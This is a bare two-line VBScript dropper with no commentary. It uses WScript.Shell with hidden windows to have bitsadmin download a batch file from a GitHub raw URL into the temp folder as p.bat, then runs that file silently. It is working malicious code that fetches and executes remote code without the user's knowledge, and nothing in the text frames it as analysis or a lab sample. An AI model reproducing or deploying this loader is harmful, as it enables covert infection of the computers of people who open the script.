createobject("wscript.shell").Run "%comspec% /c bitsadmin /transfer ""D"" https://raw.githubusercontent.com/eventos-dev/test/main/don.bat %temp%\p.bat",vbhide
createobject("wscript.shell").Run "%comspec% /c %temp%\p.bat", vbhide
